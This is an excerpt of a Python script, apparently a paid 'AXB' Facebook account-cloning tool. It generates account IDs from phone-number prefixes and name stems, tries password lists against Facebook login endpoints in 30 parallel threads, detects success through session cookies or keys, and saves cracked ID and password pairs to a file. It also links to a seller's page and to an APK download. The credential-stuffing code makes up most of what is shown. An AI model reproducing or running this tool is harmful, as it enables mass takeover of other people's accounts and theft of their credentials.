...
os.system('xdg-open https://m.me/PHYO.WAI.OLD.PAGE.SELLER')


logo=("""\033[1;36m
\033[1;37m      .o.       ooooooo  ooooo oooooooooo.  
\033[1;37m     .888.       `8888    d8'  `888'   `Y8b 
\033[1;32m    .8"888.        Y888..8P     888     888 
\033[1;33m   .8' `888.        `8888'      888oooo888' 
\033[1;31m  .88ooo8888.      .8PY888.     888    `88b 
\033[1;37m .8'     `888.    d8'  `888b    888    .88P 
\033[1;37mo88o     o8888o o888o  o88888o o888bood8P'   
\033[1;36m-----------------------------------------------------------
 𝘼𝙐𝙏𝙃𝙀𝙍    | 𝙈𝙔 𝙈𝙔𝘼𝙉𝙈𝘼𝙍                
 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  | 𝙒𝘼𝙄 𝙇𝙄𝙉 𝙆𝙃𝘼𝙄𝙉𝙂           
 𝙏𝙊𝙊𝙇      | 𝙁𝙄𝙇𝙀 𝘾𝙇𝙊𝙉𝙀                       
 𝙏𝙔𝙋𝙀      | 𝙁𝙍𝙀𝙀 𝙈𝙄𝙓                     
 𝙑𝙀𝙍𝙎𝙄𝙊𝙉   | .1                            
\033[1;36m-----------------------------------------------------------
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;33mPlease Wait Cloning started..\033[1;33m")
                        linex()
                        for user in id:
        ...
        #       chk()
                ...
                if x == ("sex"):              
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/PHYO.WAI.OLD.PAGE.SELLER/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AXB_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi AXB Sir, I Need To Buy Your Paid AXB PRO Tools Version .0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                user=[]
                clear()
                print('\033[1;33m Code example: 0967,0966,0925,0988,0945,0978,0977,0998,0997')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AXB:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;33mPlease Wait Cloning started..\033[1;33m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 0967,0966,0977,0925')
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: myintmho, lin, kyawlay, laelae\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [AXB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AXB=session.cookies.get_dict().keys()
                        if "c_user" in AXB:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AXB:
                                if 'y' in pcp:
                                        print('\033[1;36m [AXB-CP] '+ids+' | '+pas+'\033[1;36m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AXB-OK] '+ids+' | '+pas+'\033[1;32m')
                                        open('/sdcard/AXB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AXB-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AXB-OK] '+uid+' | '+pas+'\033[1;32m')
                                                        open('/sdcard/AXB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AXB-OK] '+uid+' | '+pas+'\033[1;32m')
